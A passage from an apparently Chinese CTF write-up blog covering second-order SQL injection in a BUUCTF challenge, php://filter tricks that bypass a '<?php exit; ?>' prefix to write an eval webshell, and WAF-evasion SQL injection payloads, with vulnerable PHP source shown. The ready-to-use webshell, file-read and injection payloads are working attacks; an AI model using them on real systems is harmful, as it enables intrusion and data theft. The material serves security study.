取出来的时候是这么一串：a’,content=database (),/*，注意转义字符消失了</p>\n<p>然后我们需要去 content 闭合注释符，再用单行注入把后面没用的东西注释掉</p>\n<p>最后语句变为了</p>\n<p>sql =` \"insert into comment set category = 'a',content=database(),/*', content = '*/#', bo_id = 'bo_id’&quot;;`</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023181848314.png\" alt=\"image-20221023181848314\"></p>\n<p>得到库名，下面的 getflag 操作不在赘述</p>\n<h6 id=\"2ciscn2019-华北赛区-day1-web5cyberpunk\"><a class=\"markdownIt-Anchor\" href=\"#2ciscn2019-华北赛区-day1-web5cyberpunk\">#</a> 2.[CISCN2019 华北赛区 Day1 Web5] CyberPunk</h6>\n<!--?file=?--> 接收get传入的file参数，用php伪协议读源码\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>\n<p>修改地址存在二次注入，从数据库中取 old_address 时没有过滤</p>\n<p>分析 config.php，这是一个数据库连接配置文件，没有可以利用的地方，</p>\n<p>在 confirm.php 中，对 user_name 和 phone 进行了过滤，但 address 没有，说明 address 是可能存在注入点，然后将这三个插入到数据库中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//confirm.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//var_dump($_POST);</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"variable\">$user_name</span>.<span class=\"string\">&quot;已提交订单&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">prepare</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">bind_param</span>(<span class=\"string\">&quot;sss&quot;</span>, <span class=\"variable\">$user_name</span>, <span class=\"variable\">$address</span>, <span class=\"variable\">$phone</span>);</span><br><span class=\"line\">        <span class=\"variable\">$re</span> = <span class=\"variable\">$re</span>-&gt;<span class=\"title function_ invoke__\">execute</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$re</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单提交成功&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>在 change.php, 中 address 没有进行关键字过滤，只是使用 addslashes 进行转义后进行了查询，因此注入点不会在 select 语句中，</p>\n<p>但查询完后修改 address 时，旧的 address 从数据库拿出来没有进行过滤，二次注入发生</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//change.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$fetch</span>) &amp;&amp; <span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$fetch</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class=\"variable\">$address</span>.<span class=\"string\">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;address&#x27;</span>].<span class=\"string\">&quot;&#x27; where `user_id`=&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;user_id&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单修改成功&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;未找到订单!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;信息不全&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因此我们在 confirm.php 插入数据库中时，提交注入语句</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190851989.png\" alt=\"image-20221023190851989\"></p>\n<p>在修改地址时二次引用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190938216.png\" alt=\"image-20221023190938216\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190949077.png\" alt=\"image-20221023190949077\"></p>\n<p>因为不是 ctf 教程，所以为什么 flag 在 flag.txt，flag.txt 为什么在根下就不赘述了</p>\n<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>\n<p>然后接下来带来一些花活：</p>\n<h6 id=\"php-exit-绕过\"><a class=\"markdownIt-Anchor\" href=\"#php-exit-绕过\">#</a>  <code>&lt;?php exit; ?&gt;</code>  绕过</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class=\"line\">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class=\"line\">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure>\n<p>$content 在开头增加了 exit 过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上 if (!defined (xxx)) exit; 之类的限制）</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>是可以控制协议的，我们即可使用</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>协议</mtext><mo separator=\"true\">,</mo><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>流的</mtext><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn><mo>−</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mtext>方法，将</mtext></mrow><annotation encoding=\"application/x-tex\">_POST[&#x27;filename&#x27;]是可以控制协议的，我们即可使用 php://filter协议,php://filter流的base64-decode方法，将</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">制</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">方</span><span class=\"mord cjk_fallback\">法</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">将</span></span></span></span> content 解码，利用 php base64_decode 函数特性去除 “死亡 exit”。</p>\n<p>因此我们可以找到两种 base64-decode 相关的绕过</p>\n<p>0x00 通过 base64 编码特性绕过</p>\n<p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 $content 被加上了 <code>&lt;?php exit; ?&gt;</code>  以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。由于该语句中只有 phpexit 符合 base64 解码特性，因此其余的符号会被忽略。</p>\n<p>“phpexit” 一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个 “a” 一共 8 个字符。后面在拼接我们一句话木马的 base64 编码格式。这样在解码的时候 phpexita 会被解码为无用字符，我们的一句话木马被正常解码</p>\n<p>因此我们最终传入的 payload 为：</p>\n<p><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/read=convert.base64-decode/resource=aaa.php</code></p>\n<p>在 filename 解码时，a 和 phpexit 变为了乱码，我们的 eval ($_POST [1]) 最终留了下来</p>\n<p>0x01 利用字符串操作</p>\n<p><code>&lt;?php exit; ?&gt;</code>  实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>利用如下 payload，我们便能去除 &lt;&gt; 中的内容  <code>php://filter/read=string.strip_tags/resource=php://input</code></p>\n<p>但问题在于，如果我们去除 &lt;&gt; 会导致我们的一句话木马也被去除。</p>\n<p>但 php://filter 允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 strip_tags 后再进行 base64-decode。</p>\n<p>最终 payload 如下</p>\n<p><code>txt=PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/write=string.strip_tags | convert.base64-decode/resource=aaa.php</code></p>\n<p>filename 中的 string.strip_tags 先把 exit 的 &lt;&gt; 去除，在把我们提交的 base64 编码解码，最终只剩下 <code>&lt;?php eval($_POST[1];?)</code></p>\n<h5 id=\"带有waf过滤的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#带有waf过滤的sql注入\">#</a> 带有 WAF 过滤的 SQL 注入</h5>\n<p>1. 过滤 and、or</p>\n<p>在过滤一遍的场景下可以尝试双写，大小写  less25，26</p>\n<p>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</p>\n<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>\n<p>2. 过滤空格</p>\n<p>使用 /**/ 多行注释代替  Less 26</p>\n<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>\n<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>3. 过滤注释</p>\n<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>\n<p>使用；%00 截断</p>\n<p>4.union select 过滤</p>\n<p>uniunion selecton select</p>\n<p>5. 过滤 =</p>\n<p>like</p>\n<p>regexp</p>\n<p>6.0x 通过 16 进制逃过</p>\n<h5 id=\"通过编码注入\"><a class=\"markdownIt-Anchor\" href=\"#通过编码注入\">#</a> 通过编码注入</h5>\n<ol>\n<li></li>\n</ol>\n<p>一些 mysql 不认识，但 php 认识的字符，只限制于 post</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_select_db</span>(<span class=\"string\">&#x27;adog&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;set names utf8&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$ps</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;select * from users where id=&#x27;<span class=\"subst\">$id</span>&#x27; and ps=&#x27;<span class=\"subst\">$ps</span>&#x27;&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$id</span> == <span class=\"string\">&#x27;adog&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shabi&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">flag</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_select_db</span>(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"string\">&quot;set names utf-8&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"number\">256</span>;<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ 